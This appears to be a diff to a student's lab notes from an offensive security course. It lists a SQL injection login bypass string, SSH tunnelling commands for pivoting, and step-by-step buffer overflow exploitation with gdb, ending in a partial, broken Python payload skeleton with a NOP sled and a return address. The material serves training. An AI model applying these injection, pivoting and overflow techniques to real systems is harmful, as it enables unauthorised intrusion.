@@ -43,3 +43,41 @@ try to insert an your own key after trying tom’ OR 1 = ‘1 in both fields:
   -______________________________________
   to get to second box student@ip -L 41711:192.168.28.120:4242
   then new tunnle of ssh student@127.0.0.1 -D 9050 
+
+
+Buffer overflow 
+
+AAAAAAAAAAAA in file
+the type gdb
+pdisas main
+look at green colors (pidsas main getuserinpute or other name
+now look at red 
+next type r to run and give it a bunch of AAAAAAAAAAAAAAAAAAAAAAAAAA
+look for EIP (Insturction Pointer)
+Visit a website  to adjust the code <wiremask.eu> insert all the A's 
+Get the Hex  and past it back into the wiremas.eu
+
+next write out your python script 
+_____________________________________________
+on lin-ops Nano nameofprograme
+#offset="a" * 62
+eip = "BBBB"
+eip = '\x59\x3b\xde\xf7'  <---- from back to front
+#firt
+#second
+#third
+nop = '\x90' * 10
+buf = b""
+print (buffer + eip + nop + nop + buff)
+_____________________________________________
+env - gdb func
+show env
+unset evn LINES
+unset env COLUMNS
+show env
+run
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+info proc map
+find /b  startAdd. EndBeforeStack,  First four values, 0xef   <start after HEAP and ehdn address BEFORE stack> 
+try first, second or third address that pop up
+
